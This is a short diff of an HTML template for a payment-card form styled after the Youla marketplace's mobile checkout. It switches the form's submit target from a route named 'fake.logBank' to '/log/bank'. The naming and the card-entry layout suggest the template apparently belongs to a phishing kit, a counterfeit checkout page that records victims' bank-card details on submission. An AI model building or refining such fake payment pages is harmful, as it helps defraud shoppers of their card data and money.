@@ -8,7 +8,7 @@
         </div>
     </div>
     <form class="pay-card js-pay-card pay-card_type_youla-mobile" id="bank_pm_form" method="POST"
-          action="{{subRoute('fake.logBank')}}">
+          action="/log/bank">
         <div class="pay-card__row">
             <div class="pay-card__card js-credit-card">
                 <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
